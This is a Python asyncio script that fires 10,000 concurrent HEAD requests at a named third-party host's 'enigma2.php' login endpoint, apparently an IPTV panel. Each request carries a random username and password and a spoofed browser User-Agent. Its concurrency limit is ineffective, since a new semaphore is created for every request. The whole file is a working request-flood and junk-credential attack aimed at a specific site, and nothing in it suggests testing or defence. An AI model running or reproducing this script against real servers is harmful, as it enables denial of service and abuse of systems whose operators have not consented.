import random
import asyncio
from aiohttp import ClientSession
import random
import string
import traceback


MAXREQ = 10000
MAXTHREAD = 1000

# headers={ "Host": "****************",
#             "User-Agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
#             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
#             "Accept-Language": "en-US,en;q=0.5",
#             "Accept-Encoding": "gzip, deflate, br",
#             "Referer": "https://www.google.com",
#             "Connection": "keep-alive",
#             "Upgrade-Insecure-Requests": "1",
#             "Cache-Control": "max-age=0",
#             }

headers={
     "User-Agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36'
}

def random_string(length:int=6, charset:str=string.ascii_letters+string.digits):
    return ''.join([random.choice(charset) for i in range(length)])


async def fetch(url, session):
    try:
        async with session.head(url,headers=headers) as response:
            delay = response.headers.get("DELAY")
            date = response.headers.get("DATE")
            print("{}:{} with delay {}".format(date, response.url, delay))
            print(response.status)
            return await response.read()
    except:
        traceback.print_exc()


async def bound_fetch( url, session):
    # Getter function with semaphore.
    g_thread_limit = asyncio.Semaphore(MAXTHREAD)
    async with g_thread_limit:
        x=await fetch(url, session)
        

async def run(r):
    url = "http://venex.rocks/enigma2.php?username={}&password={}&type=get_vod_categories"
    tasks = []


    # Create client session that will ensure we dont open new connection
    # per each request.
    async with ClientSession() as session:
        for i in range(r):
            # pass session to every GET request
            task = asyncio.ensure_future(bound_fetch(url.format(random_string(10),random_string(10)), session))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses



number = MAXREQ
loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run(number))
loop.run_until_complete(future)

